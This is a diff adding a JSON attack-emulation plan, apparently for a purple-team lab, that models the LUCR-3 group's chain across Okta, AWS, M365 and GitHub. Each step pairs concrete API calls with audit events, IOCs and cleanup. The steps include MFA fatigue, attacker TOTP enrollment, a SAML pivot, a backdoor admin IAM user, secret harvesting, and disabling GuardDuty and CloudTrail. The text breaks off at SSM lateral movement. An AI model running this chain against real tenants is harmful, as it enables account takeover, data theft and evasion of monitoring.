@@ -1,0 +1,1519 @@
+{
+  "status": "PHASE_3_COMPLETE",
+  "attack_chain": [
+    {
+      "step": 1,
+      "phase": 1,
+      "technique_id": "T1078.004",
+      "technique_name": "Valid Accounts: Cloud Accounts",
+      "tactic": "Initial Access",
+      "execution_context": "idp_attack",
+      "target_resource": "lucr3-okta-victim-user",
+      "description": "Authenticate to Okta using pre-seeded credentials simulating a credential purchased from a deepweb marketplace or obtained via smishing. POST to /api/v1/authn to obtain a stateToken for the MFA phase.",
+      "implementation": {
+        "method": "HTTP POST to Okta /api/v1/authn with OKTA_VICTIM_USERNAME and OKTA_VICTIM_PASSWORD from env",
+        "credential_source": "phase1_okta_creds",
+        "details": {
+          "endpoint": "POST /api/v1/authn",
+          "body": {
+            "username": "${OKTA_VICTIM_USERNAME}",
+            "password": "${OKTA_VICTIM_PASSWORD}"
+          },
+          "expected_response_status": "MFA_REQUIRED",
+          "saves": "stateToken and factorId for SMS factor"
+        }
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "user.session.start",
+          "eventSource": "Okta System Log"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "Okta System Log",
+        "Okta ThreatInsight",
+        "SIEM"
+      ],
+      "cleanup_actions": [
+        "Tokens expire \u2014 no cleanup required"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          30,
+          120
+        ]
+      },
+      "risk_level": "low",
+      "iocs_generated": [
+        "Okta login from non-corporate IP",
+        "user.session.start from anomalous geolocation",
+        "Okta ThreatInsight: suspicious authentication attempt"
+      ]
+    },
+    {
+      "step": 2,
+      "phase": 1,
+      "technique_id": "T1621",
+      "technique_name": "Multi-Factor Authentication Request Generation",
+      "tactic": "Credential Access",
+      "execution_context": "idp_attack",
+      "target_resource": "lucr3-okta-mfa-sms-policy",
+      "description": "Trigger repeated MFA SMS/push requests against the victim's enrolled factor to fatigue the target. In emulation the lab operator holds the enrolled test device and approves after 3 automated challenge requests, modelling the approval pattern without live victim interaction.",
+      "implementation": {
+        "method": "HTTP POST to Okta /api/v1/authn/factors/{factorId}/verify three times with stateToken from Step 1",
+        "credential_source": "phase1_okta_creds",
+        "details": {
+          "endpoint": "POST /api/v1/authn/factors/{factorId}/verify",
+          "body": {
+            "stateToken": "${stateToken_from_step1}"
+          },
+          "repeat": 3,
+          "expected_response_status": "MFA_CHALLENGE",
+          "saves": "sessionToken on operator approval"
+        }
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "user.authentication.auth_via_mfa",
+          "eventSource": "Okta System Log"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "Okta System Log",
+        "Okta ThreatInsight",
+        "SIEM"
+      ],
+      "cleanup_actions": [
+        "Tokens expire \u2014 no cleanup required"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          60,
+          300
+        ]
+      },
+      "risk_level": "low",
+      "iocs_generated": [
+        "Multiple MFA challenges in a short window from same source IP",
+        "Okta: repeated user.authentication.auth_via_mfa events",
+        "MFA fatigue pattern heuristic trigger"
+      ]
+    },
+    {
+      "step": 3,
+      "phase": 1,
+      "technique_id": "T1111",
+      "technique_name": "Multi-Factor Authentication Interception",
+      "tactic": "Credential Access",
+      "execution_context": "idp_attack",
+      "target_resource": "lucr3-okta-mfa-sms-policy",
+      "description": "DOCUMENTED ONLY \u2014 NOT IMPLEMENTED IN ATTACK SCRIPT. Real LUCR-3 performs SIM swapping via telecom fraud or socially engineers the helpdesk to reset MFA and forward OTP. In emulation the lab operator manually approves the MFA challenge on the enrolled test device, producing the same sessionToken outcome without illegal telecom manipulation.",
+      "implementation": {
+        "method": "Manual lab operator action \u2014 approve MFA on enrolled test device. No code in attack.py.",
+        "credential_source": "phase1_okta_creds",
+        "details": {
+          "simulation_note": "Operator holds enrolled Okta Verify app and approves the push. Outcome: sessionToken obtained.",
+          "cannot_emulate_reason": "SIM swapping is illegal telecom fraud per operational_notes.cannot_safely_emulate"
+        }
+      },
+      "expected_audit_events": [],
+      "audit_visible": false,
+      "detection_sources": [
+        "Telecom provider fraud detection \u2014 out of scope for sandbox"
+      ],
+      "cleanup_actions": [
+        "No resources created \u2014 no cleanup required"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          30,
+          120
+        ]
+      },
+      "risk_level": "low",
+      "iocs_generated": [
+        "None in lab emulation \u2014 outcome simulated by operator device approval"
+      ]
+    },
+    {
+      "step": 4,
+      "phase": 2,
+      "technique_id": "T1098.005",
+      "technique_name": "Account Manipulation: Device Registration",
+      "tactic": "Persistence",
+      "execution_context": "idp_attack",
+      "target_resource": "lucr3-okta-attacker-device",
+      "description": "Using the Okta sessionToken from the approved MFA challenge, exchange it for a session cookie and enroll an attacker-controlled TOTP device as a trusted Okta factor. This provides persistent re-authentication that survives a victim password reset.",
+      "implementation": {
+        "method": "HTTP calls to Okta API using sessionToken exchanged for session cookie; enroll token:software:totp factor",
+        "credential_source": "phase3_okta_session",
+        "details": {
+          "step1": "POST /api/v1/sessions \u2014 exchange sessionToken for session cookie",
+          "step2": "GET /api/v1/users/me \u2014 retrieve victim userId",
+          "step3": "POST /api/v1/users/{userId}/factors \u2014 enroll token:software:totp (Okta Verify TOTP)",
+          "step4": "POST /api/v1/users/{userId}/factors/{newFactorId}/lifecycle/activate \u2014 activate with TOTP code from attacker-controlled authenticator app",
+          "saves": "enrolled_factor_id, attacker_totp_secret for persistent re-authentication"
+        }
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "user.mfa.factor.activate",
+          "eventSource": "Okta System Log"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "Okta System Log",
+        "Okta Identity Threat Protection",
+        "SIEM"
+      ],
+      "cleanup_actions": [
+        "DELETE /api/v1/users/{userId}/factors/{enrolled_factor_id} to remove attacker device post-emulation"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          30,
+          180
+        ]
+      },
+      "risk_level": "medium",
+      "iocs_generated": [
+        "user.mfa.factor.activate from anomalous IP",
+        "New TOTP factor enrolled from non-corporate network",
+        "Factor enrollment outside business hours or new geolocation"
+      ]
+    },
+    {
+      "step": 5,
+      "phase": 3,
+      "technique_id": "T1078.004",
+      "technique_name": "Valid Accounts: Cloud Accounts",
+      "tactic": "Defense Evasion",
+      "execution_context": "api_attack",
+      "target_resource": "lucr3-aws-saml-idp",
+      "description": "Exchange the Okta IDP session for a SAML assertion targeting the AWS SAML SP, then call sts:AssumeRoleWithSAML to pivot from identity compromise into AWS. This bridges the IDP foothold to the cloud environment via lucr3-privileged-federated-role.",
+      "implementation": {
+        "method": "HTTP GET to Okta app embed URL to extract SAMLResponse, then boto3 sts.assume_role_with_saml()",
+        "credential_source": "phase3_okta_session",
+        "details": {
+          "step1": "GET /app/amazon_aws/{app_id}/sso/saml with Okta session cookie \u2014 parse SAMLResponse from HTML form",
+          "step2": "boto3 sts.assume_role_with_saml(RoleArn='arn:aws:iam::{ACCOUNT_ID}:role/lucr3-privileged-federated-role', PrincipalArn='arn:aws:iam::{ACCOUNT_ID}:saml-provider/lucr3-aws-saml-idp', SAMLAssertion=saml_b64)",
+          "saves": "aws_access_key_id, aws_secret_access_key, aws_session_token as phase3_aws_saml_session"
+        }
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "AssumeRoleWithSAML",
+          "eventSource": "sts.amazonaws.com"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "CloudTrail",
+        "GuardDuty",
+        "SIEM"
+      ],
+      "cleanup_actions": [
+        "STS session tokens expire in 1 hour \u2014 no explicit cleanup required"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          30,
+          120
+        ]
+      },
+      "risk_level": "medium",
+      "iocs_generated": [
+        "AssumeRoleWithSAML from anomalous source IP",
+        "GuardDuty: UnauthorizedAccess:IAMUser/MaliciousIPCaller via federation",
+        "Federated role assumption outside normal business hours"
+      ]
+    },
+    {
+      "step": 6,
+      "phase": 4,
+      "technique_id": "T1213.002",
+      "technique_name": "Data from Information Repositories: Sharepoint",
+      "tactic": "Collection",
+      "execution_context": "saas_attack",
+      "target_resource": "lucr3-m365-sharepoint-site",
+      "description": "Using the Okta session, federate into Azure AD via lucr3-azuread-saml-app to obtain a Microsoft Graph OAuth token. Enumerate and download sensitive documents from the SharePoint site to simulate LUCR-3's corporate IP collection.",
+      "implementation": {
+        "method": "Microsoft Graph API calls using MSAL token obtained via Okta SAML assertion to Azure AD",
+        "credential_source": "phase3_okta_session",
+        "details": {
+          "step1": "GET Okta SAML assertion for lucr3-azuread-saml-app embed URL",
+          "step2": "POST to https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token with SAML assertion grant \u2014 obtain Graph access_token",
+          "step3": "GET https://graph.microsoft.com/v1.0/sites?search=corporate \u2014 enumerate SharePoint sites",
+          "step4": "GET https://graph.microsoft.com/v1.0/sites/{siteId}/drive/root/children \u2014 list documents",
+          "step5": "GET https://graph.microsoft.com/v1.0/sites/{siteId}/drive/items/{itemId}/content \u2014 download up to 5 files"
+        }
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "FileAccessed",
+          "eventSource": "M365 Audit Log"
+        },
+        {
+          "eventName": "SearchQueryPerformed",
+          "eventSource": "M365 Audit Log"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "M365 Unified Audit Log",
+        "Microsoft Defender for Cloud Apps",
+        "SIEM"
+      ],
+      "cleanup_actions": [
+        "Read-only file access \u2014 downloaded files deleted from emulation host; no cloud resources created"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          60,
+          300
+        ]
+      },
+      "risk_level": "medium",
+      "iocs_generated": [
+        "SharePoint bulk file access from anomalous IP via federated identity",
+        "Microsoft Defender MCAS: impossible travel or new location alert",
+        "High-volume FileAccessed events from federated principal"
+      ]
+    },
+    {
+      "step": 7,
+      "phase": 5,
+      "technique_id": "T1580",
+      "technique_name": "Cloud Infrastructure Discovery",
+      "tactic": "Discovery",
+      "execution_context": "api_attack",
+      "target_resource": "lucr3-privileged-federated-role",
+      "description": "Using SAML-derived AWS credentials, enumerate account identity, IAM users, EC2 instances, and DynamoDB tables to map the blast radius. LUCR-3 uses CloudShell for this; emulation uses equivalent boto3 calls from the operator's host.",
+      "implementation": {
+        "method": "boto3 calls using phase3_aws_saml_session credentials",
+        "credential_source": "phase3_aws_saml_session",
+        "api_calls": [
+          {
+            "service": "sts",
+            "method": "get_caller_identity",
+            "args": {}
+          },
+          {
+            "service": "iam",
+            "method": "list_users",
+            "args": {}
+          },
+          {
+            "service": "iam",
+            "method": "list_roles",
+            "args": {}
+          },
+          {
+            "service": "ec2",
+            "method": "describe_instances",
+            "args": {
+              "Filters": [
+                {
+                  "Name": "instance-state-name",
+                  "Values": [
+                    "running"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "service": "dynamodb",
+            "method": "list_tables",
+            "args": {}
+          }
+        ]
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "GetCallerIdentity",
+          "eventSource": "sts.amazonaws.com"
+        },
+        {
+          "eventName": "ListUsers",
+          "eventSource": "iam.amazonaws.com"
+        },
+        {
+          "eventName": "ListRoles",
+          "eventSource": "iam.amazonaws.com"
+        },
+        {
+          "eventName": "DescribeInstances",
+          "eventSource": "ec2.amazonaws.com"
+        },
+        {
+          "eventName": "ListTables",
+          "eventSource": "dynamodb.amazonaws.com"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "CloudTrail",
+        "GuardDuty",
+        "SIEM"
+      ],
+      "cleanup_actions": [
+        "Read-only \u2014 no cleanup required"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          30,
+          120
+        ]
+      },
+      "risk_level": "low",
+      "iocs_generated": [
+        "GuardDuty: Recon:IAMUser/UserPermissions",
+        "Rapid IAM and EC2 enumeration from federated credential",
+        "Discovery:IAMUser/AnomalousBehavior"
+      ]
+    },
+    {
+      "step": 8,
+      "phase": 5,
+      "technique_id": "T1619",
+      "technique_name": "Cloud Storage Object Discovery",
+      "tactic": "Discovery",
+      "execution_context": "api_attack",
+      "target_resource": "lucr3-s3-corporate-data",
+      "description": "Enumerate all S3 buckets and list objects in high-value targets (lucr3-s3-corporate-data, lucr3-s3-engineering-artifacts) to identify exfiltration targets. Attacker specifically looks for terraform.tfstate and credential-bearing files.",
+      "implementation": {
+        "method": "boto3 S3 calls using phase3_aws_saml_session",
+        "credential_source": "phase3_aws_saml_session",
+        "api_calls": [
+          {
+            "service": "s3",
+            "method": "list_buckets",
+            "args": {}
+          },
+          {
+            "service": "s3",
+            "method": "list_objects_v2",
+            "args": {
+              "Bucket": "lucr3-s3-corporate-data"
+            }
+          },
+          {
+            "service": "s3",
+            "method": "list_objects_v2",
+            "args": {
+              "Bucket": "lucr3-s3-engineering-artifacts"
+            }
+          }
+        ]
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "ListBuckets",
+          "eventSource": "s3.amazonaws.com"
+        },
+        {
+          "eventName": "ListObjects",
+          "eventSource": "s3.amazonaws.com"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "CloudTrail",
+        "GuardDuty",
+        "S3 server access logs",
+        "SIEM"
+      ],
+      "cleanup_actions": [
+        "Read-only \u2014 no cleanup required"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          30,
+          90
+        ]
+      },
+      "risk_level": "low",
+      "iocs_generated": [
+        "GuardDuty: Discovery:S3/MaliciousIPCaller",
+        "Bulk ListObjects across multiple buckets from federated principal",
+        "S3 server access log: list operations from anomalous IAM principal"
+      ]
+    },
+    {
+      "step": 9,
+      "phase": 5,
+      "technique_id": "T1082",
+      "technique_name": "System Information Discovery",
+      "tactic": "Discovery",
+      "execution_context": "api_attack",
+      "target_resource": "lucr3-ec2-target",
+      "description": "Enumerate VPCs, subnets, key pairs, and SSM-managed instances to identify lateral movement targets. Identifies lucr3-ec2-target as an SSM-connected instance for subsequent SSH lateral movement.",
+      "implementation": {
+        "method": "boto3 EC2 and SSM calls using phase3_aws_saml_session",
+        "credential_source": "phase3_aws_saml_session",
+        "api_calls": [
+          {
+            "service": "ec2",
+            "method": "describe_vpcs",
+            "args": {}
+          },
+          {
+            "service": "ec2",
+            "method": "describe_subnets",
+            "args": {}
+          },
+          {
+            "service": "ec2",
+            "method": "describe_key_pairs",
+            "args": {}
+          },
+          {
+            "service": "ssm",
+            "method": "describe_instance_information",
+            "args": {}
+          }
+        ]
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "DescribeVpcs",
+          "eventSource": "ec2.amazonaws.com"
+        },
+        {
+          "eventName": "DescribeSubnets",
+          "eventSource": "ec2.amazonaws.com"
+        },
+        {
+          "eventName": "DescribeKeyPairs",
+          "eventSource": "ec2.amazonaws.com"
+        },
+        {
+          "eventName": "DescribeInstanceInformation",
+          "eventSource": "ssm.amazonaws.com"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "CloudTrail",
+        "GuardDuty",
+        "SIEM"
+      ],
+      "cleanup_actions": [
+        "Read-only \u2014 no cleanup required"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          30,
+          90
+        ]
+      },
+      "risk_level": "low",
+      "iocs_generated": [
+        "Enumeration of VPC topology and SSM instance inventory from federated credential",
+        "GuardDuty: Recon:EC2/PortProbeUnprotectedPort if extended probing occurs"
+      ]
+    },
+    {
+      "step": 10,
+      "phase": 6,
+      "technique_id": "T1136.003",
+      "technique_name": "Create Account: Cloud Account",
+      "tactic": "Persistence",
+      "execution_context": "api_attack",
+      "target_resource": "lucr3-attacker-iam-user",
+      "description": "Create backdoor IAM user lucr3-attacker-iam-user with console login to establish persistence independent of the SAML-federated session. Models LUCR-3's pattern of creating a durable IAM backdoor that survives IDP password resets.",
+      "implementation": {
+        "method": "boto3 IAM calls using phase3_aws_saml_session",
+        "credential_source": "phase3_aws_saml_session",
+        "api_calls": [
+          {
+            "service": "iam",
+            "method": "create_user",
+            "args": {
+              "UserName": "lucr3-attacker-iam-user"
+            }
+          },
+          {
+            "service": "iam",
+            "method": "create_login_profile",
+            "args": {
+              "UserName": "lucr3-attacker-iam-user",
+              "Password": "Emulat10n!Backdoor#2026",
+              "PasswordResetRequired": false
+            }
+          }
+        ]
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "CreateUser",
+          "eventSource": "iam.amazonaws.com"
+        },
+        {
+          "eventName": "CreateLoginProfile",
+          "eventSource": "iam.amazonaws.com"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "CloudTrail",
+        "GuardDuty",
+        "AWS Security Hub",
+        "SIEM"
+      ],
+      "cleanup_actions": [
+        "iam:DeleteLoginProfile + iam:DeleteUser lucr3-attacker-iam-user \u2014 in cleanup_manifest step 7"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          30,
+          90
+        ]
+      },
+      "risk_level": "medium",
+      "iocs_generated": [
+        "GuardDuty: Persistence:IAMUser/UserPermissions",
+        "New IAM user with console access created by federated principal",
+        "CreateUser + CreateLoginProfile sequence from anomalous IP"
+      ]
+    },
+    {
+      "step": 11,
+      "phase": 6,
+      "technique_id": "T1098",
+      "technique_name": "Account Manipulation",
+      "tactic": "Persistence",
+      "execution_context": "api_attack",
+      "target_resource": "lucr3-attacker-iam-user",
+      "description": "Attach the AWS-managed AdministratorAccess policy to the backdoor IAM user to grant full account permissions. LUCR-3 consistently attaches broad policies to newly created backdoor users to maximise blast radius.",
+      "implementation": {
+        "method": "boto3 IAM attach_user_policy using phase3_aws_saml_session",
+        "credential_source": "phase3_aws_saml_session",
+        "api_calls": [
+          {
+            "service": "iam",
+            "method": "attach_user_policy",
+            "args": {
+              "UserName": "lucr3-attacker-iam-user",
+              "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
+            }
+          }
+        ]
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "AttachUserPolicy",
+          "eventSource": "iam.amazonaws.com"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "CloudTrail",
+        "GuardDuty",
+        "AWS Security Hub",
+        "SIEM"
+      ],
+      "cleanup_actions": [
+        "iam:DetachUserPolicy AdministratorAccess from lucr3-attacker-iam-user \u2014 in cleanup_manifest step 6"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          15,
+          60
+        ]
+      },
+      "risk_level": "high",
+      "iocs_generated": [
+        "AdministratorAccess attached to newly created IAM user",
+        "GuardDuty: Persistence:IAMUser/UserPermissions",
+        "Privilege escalation pattern: CreateUser \u2192 AttachUserPolicy AdministratorAccess"
+      ]
+    },
+    {
+      "step": 12,
+      "phase": 6,
+      "technique_id": "T1098.001",
+      "technique_name": "Account Manipulation: Additional Cloud Credentials",
+      "tactic": "Persistence",
+      "execution_context": "api_attack",
+      "target_resource": "lucr3-attacker-iam-user",
+      "description": "Generate a long-lived AWS access key for the backdoor IAM user. This non-expiring programmatic credential persists even if the SAML federation is revoked or the victim Okta account is locked.",
+      "implementation": {
+        "method": "boto3 IAM create_access_key using phase3_aws_saml_session",
+        "credential_source": "phase3_aws_saml_session",
+        "api_calls": [
+          {
+            "service": "iam",
+            "method": "create_access_key",
+            "args": {
+              "UserName": "lucr3-attacker-iam-user"
+            }
+          }
+        ]
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "CreateAccessKey",
+          "eventSource": "iam.amazonaws.com"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "CloudTrail",
+        "GuardDuty",
+        "SIEM"
+      ],
+      "cleanup_actions": [
+        "iam:DeleteAccessKey for generated key ID on lucr3-attacker-iam-user \u2014 in cleanup_manifest step 5"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          15,
+          45
+        ]
+      },
+      "risk_level": "high",
+      "iocs_generated": [
+        "GuardDuty: Persistence:IAMUser/UserPermissions",
+        "Long-lived access key created immediately after backdoor user creation",
+        "CreateAccessKey following CreateUser + AttachUserPolicy chain"
+      ]
+    },
+    {
+      "step": 13,
+      "phase": 7,
+      "technique_id": "T1555.006",
+      "technique_name": "Credentials from Password Stores: Cloud Secrets Management Stores",
+      "tactic": "Credential Access",
+      "execution_context": "api_attack",
+      "target_resource": "lucr3-secrets-prod-db",
+      "description": "Enumerate and harvest all secrets from SecretsManager using the long-lived attacker IAM key. Retrieves synthetic database credentials, Stripe API key, and bait credentials. Accessing lucr3-bait-honey-credentials and lucr3-bait-github-pat-secret triggers canary alerts. Real LUCR-3 performs this step from CloudShell.",
+      "implementation": {
+        "method": "boto3 SecretsManager calls using phase8_attacker_iam_key",
+        "credential_source": "phase8_attacker_iam_key",
+        "api_calls": [
+          {
+            "service": "secretsmanager",
+            "method": "list_secrets",
+            "args": {}
+          },
+          {
+            "service": "secretsmanager",
+            "method": "get_secret_value",
+            "args": {
+              "SecretId": "lucr3-secrets-prod-db"
+            }
+          },
+          {
+            "service": "secretsmanager",
+            "method": "get_secret_value",
+            "args": {
+              "SecretId": "lucr3-secrets-stripe-api"
+            }
+          },
+          {
+            "service": "secretsmanager",
+            "method": "get_secret_value",
+            "args": {
+              "SecretId": "lucr3-bait-honey-credentials"
+            }
+          },
+          {
+            "service": "secretsmanager",
+            "method": "get_secret_value",
+            "args": {
+              "SecretId": "lucr3-bait-github-pat-secret"
+            }
+          }
+        ]
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "ListSecrets",
+          "eventSource": "secretsmanager.amazonaws.com"
+        },
+        {
+          "eventName": "GetSecretValue",
+          "eventSource": "secretsmanager.amazonaws.com"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "CloudTrail",
+        "GuardDuty",
+        "AWS Security Hub",
+        "SIEM"
+      ],
+      "cleanup_actions": [
+        "Read-only \u2014 no cleanup required; all secrets contain synthetic values only"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          30,
+          120
+        ]
+      },
+      "risk_level": "medium",
+      "iocs_generated": [
+        "GuardDuty: CredentialAccess:Secrets/SecretsManagerSecret",
+        "Bulk GetSecretValue from newly created IAM access key",
+        "Canary bait secrets accessed \u2014 triggers immediate detection alert"
+      ]
+    },
+    {
+      "step": 14,
+      "phase": 7,
+      "technique_id": "T1578.002",
+      "technique_name": "Modify Cloud Compute Infrastructure: Create Cloud Instance",
+      "tactic": "Defense Evasion",
+      "execution_context": "api_attack",
+      "target_resource": "lucr3-ec2-target",
+      "description": "Launch an attacker-controlled EC2 instance within lucr3-vpc as a persistent compute foothold and data staging host. LUCR-3 uses attacker-launched EC2 instances to stage bulk exfiltration before transferring to external endpoints.",
+      "implementation": {
+        "method": "boto3 EC2 run_instances and IAM create_instance_profile using phase8_attacker_iam_key",
+        "credential_source": "phase8_attacker_iam_key",
+        "api_calls": [
+          {
+            "service": "iam",
+            "method": "create_instance_profile",
+            "args": {
+              "InstanceProfileName": "lucr3-attack-instance-profile"
+            }
+          },
+          {
+            "service": "ec2",
+            "method": "run_instances",
+            "args": {
+              "ImageId": "resolve:ssm:/aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64",
+              "InstanceType": "t3.micro",
+              "MinCount": 1,
+              "MaxCount": 1,
+              "SubnetId": "${lucr3-subnet-pub-id}",
+              "SecurityGroupIds": [
+                "${lucr3-sg-ec2-id}"
+              ],
+              "IamInstanceProfile": {
+                "Name": "lucr3-attack-instance-profile"
+              },
+              "TagSpecifications": [
+                {
+                  "ResourceType": "instance",
+                  "Tags": [
+                    {
+                      "Key": "Name",
+                      "Value": "lucr3-attack-host"
+                    }
+                  ]
+                }
+              ]
+            }
+          }
+        ]
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "RunInstances",
+          "eventSource": "ec2.amazonaws.com"
+        },
+        {
+          "eventName": "CreateInstanceProfile",
+          "eventSource": "iam.amazonaws.com"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "CloudTrail",
+        "GuardDuty",
+        "AWS Security Hub",
+        "SIEM"
+      ],
+      "cleanup_actions": [
+        "ec2:TerminateInstances on lucr3-attack-host; iam:DeleteInstanceProfile lucr3-attack-instance-profile \u2014 in cleanup_manifest steps 9-10"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          60,
+          180
+        ]
+      },
+      "risk_level": "medium",
+      "iocs_generated": [
+        "EC2 instance launched by newly created attacker IAM user",
+        "RunInstances outside normal deployment pipeline",
+        "GuardDuty: Execution:EC2/MaliciousFile if payload staged on instance"
+      ]
+    },
+    {
+      "step": 15,
+      "phase": 8,
+      "technique_id": "T1550.001",
+      "technique_name": "Use Alternate Authentication Material: Application Access Token",
+      "tactic": "Defense Evasion",
+      "execution_context": "saas_attack",
+      "target_resource": "lucr3-github-target-repo",
+      "description": "Use the GitHub PAT harvested from lucr3-bait-github-pat-secret in Step 13 as a Bearer token to authenticate to GitHub. Verify token, enumerate accessible repositories, and attempt to list repo contents. Bait token is revoked and will return 401; document expected failure and proceed to Step 22 for repo cloning.",
+      "implementation": {
+        "method": "GitHub API requests using Bearer token from phase9_scraped_github_pat",
+        "credential_source": "phase9_scraped_github_pat",
+        "details": {
+          "step1": "GET https://api.github.com/user \u2014 verify token; expect 401 on revoked bait token",
+          "step2": "GET https://api.github.com/user/repos \u2014 enumerate accessible repos",
+          "note": "401 on bait token is expected and documented. Token use attempt still generates GitHub Audit Log event and triggers canary detection."
+        }
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "personal_access_token.create",
+          "eventSource": "GitHub Audit Log"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "GitHub Audit Log",
+        "GitHub Advanced Security",
+        "SIEM"
+      ],
+      "cleanup_actions": [
+        "Bait token is already revoked \u2014 no cleanup required"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          30,
+          120
+        ]
+      },
+      "risk_level": "low",
+      "iocs_generated": [
+        "GitHub API authentication attempt from anomalous IP using stolen PAT",
+        "GitHub: revoked token use attempt triggers security alert",
+        "GitHub Advanced Security: credential compromise detection"
+      ]
+    },
+    {
+      "step": 16,
+      "phase": 8,
+      "technique_id": "T1562.001",
+      "technique_name": "Impair Defenses: Disable or Modify Tools",
+      "tactic": "Defense Evasion",
+      "execution_context": "api_attack",
+      "target_resource": "lucr3-guardduty-detector",
+      "description": "Disable the GuardDuty detector using UpdateDetector (less conspicuous than DeleteDetector) to suppress threat detection before bulk S3 exfiltration. LUCR-3 consistently disables GuardDuty before bulk data theft operations.",
+      "implementation": {
+        "method": "boto3 GuardDuty calls using phase8_attacker_iam_key",
+        "credential_source": "phase8_attacker_iam_key",
+        "api_calls": [
+          {
+            "service": "guardduty",
+            "method": "list_detectors",
+            "args": {}
+          },
+          {
+            "service": "guardduty",
+            "method": "update_detector",
+            "args": {
+              "DetectorId": "${detector_id}",
+              "Enable": false
+            }
+          }
+        ]
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "UpdateDetector",
+          "eventSource": "guardduty.amazonaws.com"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "CloudTrail",
+        "AWS Security Hub (remains active after GD disabled)",
+        "SIEM"
+      ],
+      "cleanup_actions": [
+        "guardduty:UpdateDetector Enable=true \u2014 FIRST item in cleanup_order before any other cleanup"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          15,
+          60
+        ]
+      },
+      "risk_level": "high",
+      "iocs_generated": [
+        "CloudTrail: UpdateDetector disable event",
+        "AWS Security Hub: GuardDuty finding delivery suspended",
+        "SIEM: gap in GuardDuty event stream"
+      ]
+    },
+    {
+      "step": 17,
+      "phase": 8,
+      "technique_id": "T1562.008",
+      "technique_name": "Impair Defenses: Disable or Modify Cloud Logs",
+      "tactic": "Defense Evasion",
+      "execution_context": "api_attack",
+      "target_resource": "lucr3-cloudtrail",
+      "description": "Stop lucr3-cloudtrail to suppress API logging before bulk exfiltration. The StopLogging call itself is the last CloudTrail event recorded before the gap. API calls in Steps 18-22 will not appear in CloudTrail.",
+      "implementation": {
+        "method": "boto3 CloudTrail calls using phase8_attacker_iam_key",
+        "credential_source": "phase8_attacker_iam_key",
+        "api_calls": [
+          {
+            "service": "cloudtrail",
+            "method": "get_trail_status",
+            "args": {
+              "Name": "lucr3-cloudtrail"
+            }
+          },
+          {
+            "service": "cloudtrail",
+            "method": "stop_logging",
+            "args": {
+              "Name": "lucr3-cloudtrail"
+            }
+          }
+        ]
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "StopLogging",
+          "eventSource": "cloudtrail.amazonaws.com"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "CloudTrail (StopLogging itself is logged before the gap)",
+        "AWS Security Hub",
+        "SIEM"
+      ],
+      "cleanup_actions": [
+        "cloudtrail:StartLogging lucr3-cloudtrail \u2014 SECOND item in cleanup_order after GuardDuty re-enable"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          15,
+          60
+        ]
+      },
+      "risk_level": "high",
+      "iocs_generated": [
+        "CloudTrail: StopLogging event \u2014 the last event before the forensic gap",
+        "AWS Security Hub: CloudTrail trail stopped alert",
+        "SIEM: CloudTrail event stream gap correlates with exfiltration window"
+      ]
+    },
+    {
+      "step": 18,
+      "phase": 9,
+      "technique_id": "T1021.004",
+      "technique_name": "Remote Services: SSH",
+      "tactic": "Lateral Movement",
+      "execution_context": "lateral_movement",
+      "target_resource": "lucr3-ec2-target",
+      "description": "Establish a shell session on lucr3-ec2-target via AWS SSM Session Manager using the attacker IAM key. SSM provides a tunnel that bypasses the need for an exposed SSH port, matching LUCR-3's observed pattern of using AWS-native tooling for lateral movement.",
+      "implementation": {
+        "method": "boto3 SSM start_session to lucr3-ec2-target using phase8_attacker_iam_key; session tunnels over SSM without exposed port",
+        "credential_source": "phase8_attacker_iam_key",
